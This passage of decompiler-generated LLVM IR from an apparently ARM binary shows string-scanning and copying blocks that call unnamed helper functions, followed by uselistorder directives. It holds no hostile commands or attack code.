  %v2_9b8c = add i32 %v0_9b8c, %v4_9b7c
  %v2_9b94 = add i32 %v2_9b8c, %v1_9b8c
  store i32 %v2_9b94, i32* @r5, align 4
  %v0_9b98 = load i32, i32* %fp.global-to-local, align 4
  %v1_9b98 = trunc i32 %v0_9b98 to i8
  %v3_9b98 = add i32 %v2_9b94, 2115
  %v4_9b98 = inttoptr i32 %v3_9b98 to i8*
  store i8 %v1_9b98, i8* %v4_9b98, align 1
  %v0_9b9c = load i32, i32* @r4, align 4
  store i32 %v0_9b9c, i32* %r0.global-to-local, align 4
  %v1_9ba0 = inttoptr i32 %v0_9b9c to i8*
  %v2_9ba0 = call i32 @function_12480(i8* %v1_9ba0)
  %v0_9ba4 = load i32, i32* @r6, align 4
  store i32 %v0_9ba4, i32* %r1.global-to-local, align 4
  %v0_9ba8 = load i32, i32* @r4, align 4
  %v2_9ba8 = add i32 %v0_9ba8, %v2_9ba0
  store i32 %v2_9ba8, i32* @r0, align 4
  %v2_9bac = inttoptr i32 %v2_9ba8 to i8*
  %v3_9bac = call i32 @function_124a8(i8* %v2_9bac, i32 %v0_9ba4)
  store i32 %v3_9bac, i32* %r0.global-to-local, align 4
  %v0_9bb0 = load i32, i32* @sl, align 4
  %v1_9bb0 = add i32 %v0_9bb0, 16
  %v2_9bb0 = inttoptr i32 %v1_9bb0 to i32*
  %v3_9bb0 = load i32, i32* %v2_9bb0, align 4
  %v1_9bb4 = add i32 %v3_9bb0, 1
  store i32 %v1_9bb4, i32* %r3.global-to-local, align 4
  store i32 %v1_9bb4, i32* %v2_9bb0, align 4
  br label %dec_label_pc_99ac

dec_label_pc_9bc0:                                ; preds = %dec_label_pc_9604
  %v0_9bc0 = load i32, i32* %sb.global-to-local, align 4
  %v1_9bc4 = add i32 %v0_9bc0, 533
  store i32 %v1_9bc4, i32* @r4, align 4
  store i32 %v1_9bc4, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9bd0 = call i32 @function_12514(i32 %v1_9bc4, i32 255)
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  %v3_9bd8 = load i32, i32* %stack_var_-44, align 4
  %v0_9bdc = load i32, i32* @r6, align 4
  %v1_9bdc = add i32 %v0_9bdc, 1
  store i32 %v1_9bdc, i32* @r6, align 4
  %v2_9be0 = add i32 %v1_9bdc, %v3_9bd8
  store i32 %v2_9be0, i32* %r0.global-to-local, align 4
  %v1_9be4 = inttoptr i32 %v2_9be0 to i8*
  %v2_9be4 = call i32 @function_12480(i8* %v1_9be4)
  store i32 %v2_9be4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9be8 = icmp eq i32 %v2_9be4, 0
  store i1 %v2_9be8, i1* %cpsr_z.global-to-local, align 1
  %tmp212 = icmp slt i32 %v2_9be4, 1
  br i1 %tmp212, label %dec_label_pc_9614, label %dec_label_pc_9bf0

dec_label_pc_9bf0:                                ; preds = %dec_label_pc_9bc0
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_9bf4 = load i32, i32* %stack_var_-44, align 4
  %v0_9bf8 = load i32, i32* @r6, align 4
  %v2_9bf8 = add i32 %v0_9bf8, %v3_9bf4
  store i32 %v2_9bf8, i32* %r0.global-to-local, align 4
  %v1_9bfc = inttoptr i32 %v2_9bf8 to i8*
  %v2_9bfc = call i32 @function_12480(i8* %v1_9bfc)
  store i32 %v2_9bfc, i32* %r0.global-to-local, align 4
  %v2_9c00 = icmp ugt i32 %v2_9bfc, 254
  store i1 %v2_9c00, i1* %cpsr_c.global-to-local, align 1
  %v7_9c00 = icmp eq i32 %v2_9bfc, 255
  store i1 %v7_9c00, i1* %cpsr_z.global-to-local, align 1
  %v8_9c04 = icmp sgt i32 %v2_9bfc, 255
  br i1 %v8_9c04, label %dec_label_pc_9614, label %dec_label_pc_9c08

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9bf0
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  %v3_9c0c = load i32, i32* %stack_var_-44, align 4
  %v0_9c10 = load i32, i32* @r4, align 4
  store i32 %v0_9c10, i32* @r0, align 4
  %v0_9c14 = load i32, i32* @r6, align 4
  %v2_9c14 = add i32 %v0_9c14, %v3_9c0c
  store i32 %v2_9c14, i32* %r1.global-to-local, align 4
  %v2_9c18 = inttoptr i32 %v0_9c10 to i8*
  %v3_9c18 = call i32 @function_124a8(i8* %v2_9c18, i32 %v2_9c14)
  store i32 %v3_9c18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9614

dec_label_pc_9c20:                                ; preds = %dec_label_pc_98a0
  store i32 7, i32* @ip, align 4
  store i32 %v10_82b0, i32* @lr, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9c2c = load i32, i32* @r6, align 4
  %v1_9c2c = add i32 %v0_9c2c, 4
  %v2_9c2c = inttoptr i32 %v1_9c2c to i8*
  %v3_9c2c = load i8, i8* %v2_9c2c, align 1
  %v4_9c2c = zext i8 %v3_9c2c to i32
  store i32 %v4_9c2c, i32* @r3, align 4
  %v2_9c30 = icmp ugt i8 %v3_9c2c, 114
  store i1 %v2_9c30, i1* %cpsr_c.global-to-local, align 1
  %v7_9c30 = icmp eq i8 %v3_9c2c, 115
  store i1 %v7_9c30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c30, label %bb213, label %.thread47

bb213:                                            ; preds = %dec_label_pc_9c20
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_9c20, %bb213
  %v3_9c40 = phi i32 [ 7, %dec_label_pc_9c20 ], [ 8, %bb213 ]
  %v1_9c44 = sub nsw i32 1, %v3_9c40
  %v1_9c48 = load i32, i32* @r7, align 4
  %v2_9c48 = add i32 %v1_9c48, %v1_9c44
  store i32 %v2_9c48, i32* @r2, align 4
  %v2_9c4c = add i32 %v3_9c40, %v0_9c2c
  store i32 %v2_9c4c, i32* @r1, align 4
  store i32 %v0_9c2c, i32* @r0, align 4
  %v3_9c54 = call i32 @function_13670(i32 %v0_9c2c, i32 %v2_9c4c, i32 %v2_9c48)
  store i32 %v3_9c54, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v0_9c64 = load i32, i32* @r5, align 4
  %v1_9c64 = load i32, i32* @r4, align 4
  %v2_9c64 = add i32 %v1_9c64, %v0_9c64
  %v3_9c64 = inttoptr i32 %v2_9c64 to i8*
  %v4_9c64 = load i8, i8* %v3_9c64, align 1
  %v6_9c64 = zext i8 %v4_9c64 to i32
  store i32 %v6_9c64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_9c68 = icmp eq i8 %v4_9c64, 0
  store i1 %v9_9c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c68, label %dec_label_pc_9ca8, label %dec_label_pc_9c70

dec_label_pc_9c70:                                ; preds = %.thread47
  %v2_9c70 = icmp ugt i8 %v4_9c64, 46
  store i1 %v2_9c70, i1* %cpsr_c.global-to-local, align 1
  %v7_9c70 = icmp eq i8 %v4_9c64, 47
  store i1 %v7_9c70, i1* %cpsr_z.global-to-local, align 1
  %v1_9c74 = load i32, i32* @r6, align 4
  br i1 %v7_9c70, label %bb214, label %dec_label_pc_9c7c

bb214:                                            ; preds = %dec_label_pc_9c70
  store i32 %v1_9c74, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9d28

dec_label_pc_9c7c:                                ; preds = %dec_label_pc_9c70
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9c8c

dec_label_pc_9c84:                                ; preds = %dec_label_pc_9c8c
  %v2_9c84 = icmp ugt i8 %v4_9c98, 46
  store i1 %v2_9c84, i1* %cpsr_c.global-to-local, align 1
  %v7_9c84 = icmp eq i8 %v4_9c98, 47
  store i1 %v7_9c84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c84, label %dec_label_pc_9d28, label %dec_label_pc_9c8c

dec_label_pc_9c8c:                                ; preds = %dec_label_pc_9c84, %dec_label_pc_9c7c
  %v0_9c8c = phi i32 [ %v1_9c8c, %dec_label_pc_9c84 ], [ 0, %dec_label_pc_9c7c ]
  %v1_9c8c = add i32 %v0_9c8c, 1
  store i32 %v1_9c8c, i32* %r1.global-to-local, align 4
  store i32 %v10_82b0, i32* @ip, align 4
  store i32 %v1_9c8c, i32* %stack_var_-44, align 4
  %v2_9c98 = add i32 %v1_9c8c, %v1_9c74
  %v3_9c98 = inttoptr i32 %v2_9c98 to i8*
  %v4_9c98 = load i8, i8* %v3_9c98, align 1
  %v6_9c98 = zext i8 %v4_9c98 to i32
  store i32 %v6_9c98, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9c9c = icmp eq i8 %v4_9c98, 0
  store i1 %v2_9c9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9c98, i32* %r2.global-to-local, align 4
  br i1 %v2_9c9c, label %dec_label_pc_9ca8, label %dec_label_pc_9c84

dec_label_pc_9ca8:                                ; preds = %dec_label_pc_9c8c, %.thread47, %dec_label_pc_9d28
  %v0_9ca8 = load i32, i32* @r6, align 4
  store i32 %v0_9ca8, i32* %r0.global-to-local, align 4
  %v1_9cac = inttoptr i32 %v0_9ca8 to i8*
  %v2_9cac = call i32 @function_12480(i8* %v1_9cac)
  store i32 %v2_9cac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cb0 = icmp eq i32 %v2_9cac, 0
  store i1 %v2_9cb0, i1* %cpsr_z.global-to-local, align 1
  %tmp215 = icmp slt i32 %v2_9cac, 1
  br i1 %tmp215, label %dec_label_pc_9cc8, label %dec_label_pc_9cb8

dec_label_pc_9cb8:                                ; preds = %dec_label_pc_9ca8
  %v0_9cb8 = load i32, i32* @r6, align 4
  store i32 %v0_9cb8, i32* %r0.global-to-local, align 4
  %v1_9cbc = inttoptr i32 %v0_9cb8 to i8*
  %v2_9cbc = call i32 @function_12480(i8* %v1_9cbc)
  store i32 %v2_9cbc, i32* %r0.global-to-local, align 4
  %v2_9cc0 = icmp ugt i32 %v2_9cbc, 126
  store i1 %v2_9cc0, i1* %cpsr_c.global-to-local, align 1
  %v7_9cc0 = icmp eq i32 %v2_9cbc, 127
  store i1 %v7_9cc0, i1* %cpsr_z.global-to-local, align 1
  %v7_9cc4 = icmp slt i32 %v2_9cbc, 128
  br i1 %v7_9cc4, label %dec_label_pc_9e88, label %dec_label_pc_9cc8

dec_label_pc_9cc8:                                ; preds = %dec_label_pc_9cb8, %dec_label_pc_9ca8, %dec_label_pc_9e88
  store i32 %v10_82b0, i32* @lr, align 4
  %v3_9ccc = load i32, i32* %stack_var_-44, align 4
  %v0_9cd0 = load i32, i32* @r6, align 4
  %v1_9cd0 = add i32 %v0_9cd0, 1
  store i32 %v1_9cd0, i32* @r5, align 4
  %v2_9cd4 = add i32 %v1_9cd0, %v3_9ccc
  store i32 %v2_9cd4, i32* %r0.global-to-local, align 4
  %v1_9cd8 = inttoptr i32 %v2_9cd4 to i8*
  %v2_9cd8 = call i32 @function_12480(i8* %v1_9cd8)
  store i32 %v2_9cd8, i32* %r0.global-to-local, align 4
  %v2_9cdc = icmp ugt i32 %v2_9cd8, 254
  store i1 %v2_9cdc, i1* %cpsr_c.global-to-local, align 1
  %v7_9cdc = icmp eq i32 %v2_9cd8, 255
  store i1 %v7_9cdc, i1* %cpsr_z.global-to-local, align 1
  %v8_9ce0 = icmp sgt i32 %v2_9cd8, 255
  br i1 %v8_9ce0, label %dec_label_pc_98d8, label %dec_label_pc_9ce4

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9cc8
  %v0_9ce4 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ce8 = add i32 %v0_9ce4, 533
  store i32 %v1_9ce8, i32* @r4, align 4
  store i32 %v1_9ce8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9cf4 = call i32 @function_12514(i32 %v1_9ce8, i32 255)
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_9cfc = load i32, i32* %stack_var_-44, align 4
  %v0_9d00 = load i32, i32* @r5, align 4
  %v2_9d00 = add i32 %v0_9d00, %v3_9cfc
  store i32 %v2_9d00, i32* %r0.global-to-local, align 4
  %v1_9d04 = inttoptr i32 %v2_9d00 to i8*
  %v2_9d04 = call i32 @function_12480(i8* %v1_9d04)
  store i32 %v2_9d04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9d08 = icmp eq i32 %v2_9d04, 0
  store i1 %v2_9d08, i1* %cpsr_z.global-to-local, align 1
  %tmp216 = icmp slt i32 %v2_9d04, 1
  br i1 %tmp216, label %dec_label_pc_98d8, label %dec_label_pc_9d10

dec_label_pc_9d10:                                ; preds = %dec_label_pc_9ce4
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  %v3_9d14 = load i32, i32* %stack_var_-44, align 4
  %v0_9d18 = load i32, i32* @r4, align 4
  store i32 %v0_9d18, i32* @r0, align 4
  %v0_9d1c = load i32, i32* @r5, align 4
  %v2_9d1c = add i32 %v0_9d1c, %v3_9d14
  store i32 %v2_9d1c, i32* %r1.global-to-local, align 4
  %v2_9d20 = inttoptr i32 %v0_9d18 to i8*
  %v3_9d20 = call i32 @function_124a8(i8* %v2_9d20, i32 %v2_9d1c)
  store i32 %v3_9d20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98d8

dec_label_pc_9d28:                                ; preds = %dec_label_pc_9c84, %bb214
  %v2_9d2c = phi i32 [ %v1_9c74, %bb214 ], [ %v2_9c98, %dec_label_pc_9c84 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9d2c = inttoptr i32 %v2_9d2c to i8*
  store i8 0, i8* %v3_9d2c, align 1
  br label %dec_label_pc_9ca8

dec_label_pc_9d34:                                ; preds = %dec_label_pc_9858
  %v1_9d34 = add i32 %v0_9d34, 1
  store i32 %v1_9d34, i32* %ip.global-to-local, align 4
  %v2_9d38 = add i32 %v0_9858, %v1_9d34
  store i32 %v2_9d38, i32* %r4.global-to-local, align 4
  store i32 %v10_82b0, i32* @lr, align 4
  store i32 %v2_9d38, i32* %r0.global-to-local, align 4
  store i32 %v1_9d34, i32* %stack_var_-44, align 4
  %v1_9d48 = inttoptr i32 %v2_9d38 to i8*
  %v2_9d48 = call i32 @function_12480(i8* %v1_9d48)
  store i32 %v2_9d48, i32* %r0.global-to-local, align 4
  %v0_9d4c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d4c = add i32 %v0_9d4c, %v2_9d48
  store i32 %v2_9d4c, i32* @r4, align 4
  %v1_9d50 = add i32 %v2_9d4c, -1
  %v2_9d50 = inttoptr i32 %v1_9d50 to i8*
  %v3_9d50 = load i8, i8* %v2_9d50, align 1
  %v4_9d50 = zext i8 %v3_9d50 to i32
  store i32 %v4_9d50, i32* %r3.global-to-local, align 4
  %v2_9d54 = icmp ugt i8 %v3_9d50, 33
  store i1 %v2_9d54, i1* %cpsr_c.global-to-local, align 1
  %v7_9d54 = icmp eq i8 %v3_9d50, 34
  store i1 %v7_9d54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d54, label %dec_label_pc_9d5c, label %dec_label_pc_9864

dec_label_pc_9d5c:                                ; preds = %dec_label_pc_9d34
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_9d60 = load i32, i32* %stack_var_-44, align 4
  %v0_9d64 = load i32, i32* @r5, align 4
  %v2_9d64 = add i32 %v0_9d64, %v3_9d60
  store i32 %v2_9d64, i32* %r4.global-to-local, align 4
  store i32 %v2_9d64, i32* %r0.global-to-local, align 4
  %v1_9d6c = inttoptr i32 %v2_9d64 to i8*
  %v2_9d6c = call i32 @function_12480(i8* %v1_9d6c)
  store i32 %v2_9d6c, i32* %r0.global-to-local, align 4
  %v2_9d70 = add i32 %v2_9d64, %v2_9d6c
  store i32 %v2_9d70, i32* @r4, align 4
  %v0_9d74 = load i32, i32* @r6, align 4
  %v1_9d74 = trunc i32 %v0_9d74 to i8
  %v3_9d74 = add i32 %v2_9d70, -1
  %v4_9d74 = inttoptr i32 %v3_9d74 to i8*
  store i8 %v1_9d74, i8* %v4_9d74, align 1
  br label %dec_label_pc_9864

dec_label_pc_9d7c:                                ; preds = %dec_label_pc_98cc
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_9d80 = load i32, i32* %stack_var_-44, align 4
  %v0_9d84 = load i32, i32* @r6, align 4
  %v1_9d84 = add i32 %v0_9d84, 1
  store i32 %v1_9d84, i32* @r5, align 4
  %v2_9d88 = add i32 %v1_9d84, %v3_9d80
  store i32 %v2_9d88, i32* %r0.global-to-local, align 4
  %v1_9d8c = inttoptr i32 %v2_9d88 to i8*
  %v2_9d8c = call i32 @function_12480(i8* %v1_9d8c)
  store i32 %v2_9d8c, i32* %r0.global-to-local, align 4
  %v2_9d90 = icmp ugt i32 %v2_9d8c, 254
  store i1 %v2_9d90, i1* %cpsr_c.global-to-local, align 1
  %v7_9d90 = icmp eq i32 %v2_9d8c, 255
  store i1 %v7_9d90, i1* %cpsr_z.global-to-local, align 1
  %v8_9d94 = icmp sgt i32 %v2_9d8c, 255
  br i1 %v8_9d94, label %dec_label_pc_98d8, label %dec_label_pc_9d98

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9d7c
  %v0_9d98 = load i32, i32* %sb.global-to-local, align 4
  %v1_9d9c = add i32 %v0_9d98, 533
  store i32 %v1_9d9c, i32* @r4, align 4
  store i32 %v1_9d9c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9da8 = call i32 @function_12514(i32 %v1_9d9c, i32 255)
  store i32 %v10_82b0, i32* @ip, align 4
  %v3_9db0 = load i32, i32* %stack_var_-44, align 4
  %v0_9db4 = load i32, i32* @r5, align 4
  %v2_9db4 = add i32 %v0_9db4, %v3_9db0
  store i32 %v2_9db4, i32* %r0.global-to-local, align 4
  %v1_9db8 = inttoptr i32 %v2_9db4 to i8*
  %v2_9db8 = call i32 @function_12480(i8* %v1_9db8)
  store i32 %v2_9db8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9dbc = icmp eq i32 %v2_9db8, 0
  store i1 %v2_9dbc, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v2_9db8, 1
  br i1 %tmp217, label %dec_label_pc_98d8, label %dec_label_pc_9dc4

dec_label_pc_9dc4:                                ; preds = %dec_label_pc_9d98
  store i32 %v10_82b0, i32* @lr, align 4
  %v3_9dc8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dcc = load i32, i32* @r4, align 4
  store i32 %v0_9dcc, i32* @r0, align 4
  %v0_9dd0 = load i32, i32* @r5, align 4
  %v2_9dd0 = add i32 %v0_9dd0, %v3_9dc8
  store i32 %v2_9dd0, i32* %r1.global-to-local, align 4
  %v2_9dd4 = inttoptr i32 %v0_9dcc to i8*
  %v3_9dd4 = call i32 @function_124a8(i8* %v2_9dd4, i32 %v2_9dd0)
  store i32 %v3_9dd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98d8

dec_label_pc_9ddc:                                ; preds = %dec_label_pc_8480
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9de0 = call i32 @function_11be8(i32 50)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v3_9dec = call i32 @function_11b24(i32 50, i32* null)
  store i32 %v3_9dec, i32* %r1.global-to-local, align 4
  %v0_9df4 = load i32, i32* @r5, align 4
  %v1_9df4 = add i32 %v0_9df4, 20
  store i32 %v1_9df4, i32* @r0, align 4
  %v2_9df8 = inttoptr i32 %v1_9df4 to i8*
  %v3_9df8 = call i32 @function_124a8(i8* %v2_9df8, i32 %v3_9dec)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9e00 = call i32 @function_11b48(i32 50)
  store i32 %v1_9e00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

dec_label_pc_9e04:                                ; preds = %dec_label_pc_8480, %dec_label_pc_9ef4, %dec_label_pc_9ec8, %dec_label_pc_9e9c, %dec_label_pc_9e5c, %dec_label_pc_9ddc
  store i32 %v0_83cc, i32* @r0, align 4
  %v0_9e08 = load i32, i32* @r8, align 4
  store i32 %v0_9e08, i32* %r1.global-to-local, align 4
  %v2_9e0c = inttoptr i32 %v0_83cc to i8*
  %v3_9e0c = call i32 @function_124a8(i8* %v2_9e0c, i32 %v0_9e08)
  store i32 %v3_9e0c, i32* %r0.global-to-local, align 4
  store i32 %v0_835c, i32* %r2.global-to-local, align 4
  %v0_9e14 = load i32, i32* %fp.global-to-local, align 4
  %v1_9e14 = add i32 %v0_9e14, 1
  store i32 %v1_9e14, i32* %fp.global-to-local, align 4
  %v0_9e18 = load i32, i32* @r5, align 4
  %v3_9e1c = icmp uge i32 %v1_9e14, %v0_835c
  store i1 %v3_9e1c, i1* %cpsr_c.global-to-local, align 1
  %v9_9e1c = icmp eq i32 %v1_9e14, %v0_835c
  store i1 %v9_9e1c, i1* %cpsr_z.global-to-local, align 1
  %v1_9e20 = add i32 %v0_9e18, 3140
  store i32 %v1_9e20, i32* @r5, align 4
  br i1 %v9_9e1c, label %dec_label_pc_9e28, label %dec_label_pc_838c

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9e04
  %v0_9e38 = load i32, i32* @r7, align 4
  %v1_9e38 = and i32 %v0_9e38, 128
  %v2_9e38 = icmp ne i32 %v1_9e38, 0
  store i1 %v2_9e38, i1* %cpsr_c.global-to-local, align 1
  %v3_9e38 = udiv i32 %v0_9e38, 256
  %v1_9e3c = add i32 %v2_8370, 1452
  store i32 %v1_9e3c, i32* %r3.global-to-local, align 4
  %v2_9e40 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_9e40, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_84ec.preheader

dec_label_pc_9e5c:                                ; preds = %dec_label_pc_8480
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e60 = call i32 @function_11be8(i32 51)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v3_9e6c = call i32 @function_11b24(i32 51, i32* null)
  store i32 %v3_9e6c, i32* %r1.global-to-local, align 4
  %v0_9e74 = load i32, i32* @r5, align 4
  %v1_9e74 = add i32 %v0_9e74, 20
  store i32 %v1_9e74, i32* @r0, align 4
  %v2_9e78 = inttoptr i32 %v1_9e74 to i8*
  %v3_9e78 = call i32 @function_124a8(i8* %v2_9e78, i32 %v3_9e6c)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e80 = call i32 @function_11b48(i32 51)
  store i32 %v1_9e80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

dec_label_pc_9e88:                                ; preds = %dec_label_pc_9cb8
  %v0_9e88 = load i32, i32* %sb.global-to-local, align 4
  %v0_9e8c = load i32, i32* @r6, align 4
  store i32 %v0_9e8c, i32* %r1.global-to-local, align 4
  %v1_9e90 = add i32 %v0_9e88, 789
  store i32 %v1_9e90, i32* @r0, align 4
  %v2_9e94 = inttoptr i32 %v1_9e90 to i8*
  %v3_9e94 = call i32 @function_124a8(i8* %v2_9e94, i32 %v0_9e8c)
  store i32 %v3_9e94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9cc8

dec_label_pc_9e9c:                                ; preds = %dec_label_pc_8480
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9ea0 = call i32 @function_11be8(i32 48)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v3_9eac = call i32 @function_11b24(i32 48, i32* null)
  store i32 %v3_9eac, i32* %r1.global-to-local, align 4
  %v0_9eb4 = load i32, i32* @r5, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 20
  store i32 %v1_9eb4, i32* @r0, align 4
  %v2_9eb8 = inttoptr i32 %v1_9eb4 to i8*
  %v3_9eb8 = call i32 @function_124a8(i8* %v2_9eb8, i32 %v3_9eac)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9ec0 = call i32 @function_11b48(i32 48)
  store i32 %v1_9ec0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

dec_label_pc_9ec8:                                ; preds = %dec_label_pc_8480
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9ecc = call i32 @function_11be8(i32 47)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_9ed8 = call i32 @function_11b24(i32 47, i32* null)
  store i32 %v3_9ed8, i32* %r1.global-to-local, align 4
  %v0_9ee0 = load i32, i32* @r5, align 4
  %v1_9ee0 = add i32 %v0_9ee0, 20
  store i32 %v1_9ee0, i32* @r0, align 4
  %v2_9ee4 = inttoptr i32 %v1_9ee0 to i8*
  %v3_9ee4 = call i32 @function_124a8(i8* %v2_9ee4, i32 %v3_9ed8)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9eec = call i32 @function_11b48(i32 47)
  store i32 %v1_9eec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

dec_label_pc_9ef4:                                ; preds = %dec_label_pc_8480
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9ef8 = call i32 @function_11be8(i32 49)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v3_9f04 = call i32 @function_11b24(i32 49, i32* null)
  store i32 %v3_9f04, i32* %r1.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r5, align 4
  %v1_9f0c = add i32 %v0_9f0c, 20
  store i32 %v1_9f0c, i32* @r0, align 4
  %v2_9f10 = inttoptr i32 %v1_9f0c to i8*
  %v3_9f10 = call i32 @function_124a8(i8* %v2_9f10, i32 %v3_9f04)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9f18 = call i32 @function_11b48(i32 49)
  store i32 %v1_9f18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e04

; uselistorder directives
  uselistorder i32 %v2_9e40, { 1, 0 }
  uselistorder i32 %v1_9e3c, { 1, 0 }
  uselistorder i32 %v0_9e38, { 0, 2, 1 }
  uselistorder i32 %v1_9e20, { 1, 0 }
  uselistorder i32 %v1_9d34, { 1, 0, 2 }
  uselistorder i8 %v4_9c98, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9c8c, { 0, 2, 3, 1 }
  uselistorder i1 %v7_9c84, { 1, 0 }
  uselistorder i32 %v1_9c74, { 1, 0, 2 }
  uselistorder i1 %v7_9c70, { 1, 0 }
  uselistorder i1 %v9_9c68, { 1, 0 }
  uselistorder i32 %v0_9c2c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9b8c, { 1, 0 }
  uselistorder i32 %v2_9b68, { 1, 0, 2 }
  uselistorder i32 %v1_9b60, { 1, 0, 2 }
  uselistorder i32 %v1_9ae8, { 0, 2, 1 }
  uselistorder i32 %v0_9ae8, { 0, 2, 1 }
  uselistorder i32 %v2_9a5c, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i8 %v4_9a34, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9a28, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9a20, { 1, 0 }
  uselistorder i32 %v1_9a10, { 1, 0, 2 }
  uselistorder i1 %v7_9a0c, { 1, 0 }
  uselistorder i32 %v0_99cc, { 2, 0, 1, 3 }
  uselistorder i32 %v3_9990, { 2, 0, 1, 3 }
  uselistorder i32 %v2_9974, { 1, 0, 2 }
  uselistorder i32 %v4_996c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9894, { 1, 0 }
  uselistorder i32 %v0_9858, { 1, 0 }
  uselistorder i32 %v0_9d34, { 1, 0 }
  uselistorder i1 %v7_9814, { 1, 0 }
  uselistorder i32 %v0_97fc, { 1, 0 }
  uselistorder i32 %v2_97ec, { 1, 0, 2 }
  uselistorder i32 %v1_97b8, { 1, 0 }
  uselistorder i32 %v0_97b8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_9750, { 1, 0 }
  uselistorder i32 %v5_974c, { 1, 2, 6, 4, 5, 3, 0, 7, 8 }
  uselistorder i32 %v2_9734.v4_971c, { 1, 0, 2 }
  uselistorder i1 %v7_96f8, { 1, 0 }
  uselistorder i32 %v1_95d8, { 1, 0, 2 }
  uselistorder i32 %v1_95d0, { 1, 0 }
  uselistorder i1 %v7_95b8, { 1, 0 }
  uselistorder i32 %v5_95b4, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_959c.v4_9584, { 1, 0, 2 }
  uselistorder i1 %v7_9564, { 1, 0 }
  uselistorder i32 %v0_94cc, { 1, 0 }
  uselistorder i32 %v0_94b4, { 1, 0 }
  uselistorder i32 %v0_94b8, { 1, 0 }
  uselistorder i32 %v1_9490, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_945c, { 1, 0 }
  uselistorder i1 %v7_9424, { 0, 2, 1 }
  uselistorder i32 %v1_9448, { 1, 0 }
  uselistorder i32 %v3_9440, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %v0_9434, { 1, 0 }
  uselistorder i1 %v7_93a8, { 1, 0 }
  uselistorder i32 %v5_93a4, { 1, 4, 2, 3, 5, 0, 6, 7 }
  uselistorder i32 %v2_938c, { 1, 0, 2 }
